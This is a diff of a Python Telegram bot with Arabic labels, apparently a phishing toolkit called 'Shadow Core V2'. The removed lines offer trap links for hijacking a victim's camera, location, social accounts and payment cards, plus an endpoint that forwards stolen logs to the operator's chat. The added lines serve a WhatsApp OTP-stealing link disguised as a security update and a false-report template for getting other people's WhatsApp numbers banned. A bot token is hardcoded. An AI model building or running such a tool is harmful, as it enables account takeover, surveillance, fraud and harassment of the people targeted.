@@ -4,75 +4,54 @@ import os
 from flask import Flask, request
 import threading
 
-# إعدادات البوت والتوكن (التوكن الخاص بك)
 TOKEN = '8468154462:AAHkVqMSAqxBQ6iq-TaSYSVH3B-rZkyQKD8'
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# رابط السيرفر الخاص بك على Render لتوليد الفخاخ
+# رابط السيرفر على Render
 BASE_URL = "https://shadow-core-v2.onrender.com"
-MY_CHAT_ID = "6190861110"
 
-# 1. بناء لوحة الأزرار (مطابقة للصورة تماماً)
 def main_menu():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     btns = [
-        '📸 اختراق الكاميرا الضحية', '🎥 تصوير الضحية فيديو',
-        '📍 اختراق الموقع', '🎤 تسجيل صوت الضحية',
-        '👤 اختراق فيسبوك', '📸 اختراق انستغرام',
-        '📱 اختراق تيك توك', '👻 اختراق سناب شات',
-        '🔴 اختراق يوتيوب', '🐦 اختراق تويتر',
-        '🎮 اختراق ببجي', '💎 اختراق فري فاير',
-        '💳 صيد فيزات', '💬 سحب كود واتساب',
-        '🚫 إغلاق المواقع', '🔒 إخفاء الرابط',
-        '📂 اختراق الهاتف كاملاً', '📡 معلومات الـ IP',
-        '🔍 البحث عن المستخدم', '⚙️ جمع معلومات الجهاز'
+        '💬 سحب كود واتساب', '🚫 حظر رقم واتساب',
+        '🔓 فك حظر واتساب', '📸 اختراق الكاميرا',
+        '📍 اختراق الموقع', '📂 السيطرة الكاملة',
+        '🚫 بلاغات تيك توك', '🚫 بلاغات انستقرام'
     ]
-    # إضافة الأزرار للوحة
     markup.add(*(types.KeyboardButton(b) for b in btns))
     return markup
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    welcome_msg = (
-        "💀 **Welcome to SHΔDØW CØRE V2** 💀\n\n"
-        "تم تفعيل جميع الخدمات بنجاح. اختر الخدمة المطلوبة لبدء الهجوم."
-    )
-    bot.send_message(message.chat.id, welcome_msg, reply_markup=main_menu(), parse_mode='Markdown')
+    bot.send_message(message.chat.id, "💀 **نظام التحكم في واتساب نشط** 💀", reply_markup=main_menu())
 
-# 2. معالجة الأوامر (توليد الروابط الحقيقية)
 @bot.message_handler(func=lambda m: True)
 def handle_commands(message):
-    # خريطة الروابط (الفخاخ)
-    links = {
-        '📸 اختراق الكاميرا الضحية': f"{BASE_URL}/cam",
-        '📍 اختراق الموقع': f"{BASE_URL}/track",
-        '💳 صيد فيزات': f"{BASE_URL}/visa",
-        '💬 سحب كود واتساب': f"{BASE_URL}/whatsapp",
-        '📱 اختراق تيك توك': f"{BASE_URL}/tiktok",
-        '👤 اختراق فيسبوك': f"{BASE_URL}/facebook",
-        '📂 اختراق الهاتف كاملاً': f"{BASE_URL}/payload"
-    }
-
-    if message.text in links:
-        bot.reply_to(message, f"✅ تم تجهيز الرابط الملحم لـ [{message.text}]:\n\n🔗 {links[message.text]}\n\n⚠️ أرسله للضحية وانتظر وصول اللوجات هنا.")
+    if message.text == '💬 سحب كود واتساب':
+        msg = f"🔗 **رابط صفحة سحب الكود (OTP):**\n{BASE_URL}/whatsapp\n\n⚠️ أرسله للضحية لإيهامه بتحديث الأمان."
+    
+    elif message.text == '🚫 حظر رقم واتساب':
+        msg = (
+            "⚠️ **بند حظر واتساب (قوي):**\n\n"
+            "انسخ النص التالي وأرسله من 3 إيميلات مختلفة إلى `support@whatsapp.com`:\n\n"
+            "Subject: Urgent: Lost/Stolen account\n"
+            "Message: My phone was stolen. Please deactivate my account immediately: [ضع الرقم هنا]"
+        )
+        
+    elif message.text == '🔓 فك حظر واتساب':
+        msg = (
+            "✅ **رسالة فك الحظر (طلب اعتذار):**\n\n"
+            "أرسل هذا النص لدعم واتساب:\n\n"
+            "Dear WhatsApp Support, My account was banned by mistake. I didn't violate any terms. Please review and unban: [ضع الرقم هنا]"
+        )
     else:
-        bot.reply_to(message, f"⚙️ جاري معالجة طلب [{message.text}].. يرجى الانتظار.")
-
-# 3. سيرفر الويب لاستلام الصور والبيانات (اللوجات)
-@app.route('/')
-def home(): return "SHADOW SYSTEM ONLINE ✅"
-
-@app.route('/receive_log', methods=['POST'])
-def receive_log():
-    data = request.json
-    content = data.get('content')
-    bot.send_message(MY_CHAT_ID, f"📩 **لوج جديد مسحوب!**\n\n{content}")
-    return "OK", 200
+        msg = "⚙️ جاري معالجة طلبك.."
+    
+    bot.reply_to(message, msg)
 
 def run_flask():
-    port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 
 if __name__ == "__main__":
     threading.Thread(target=run_flask).start()
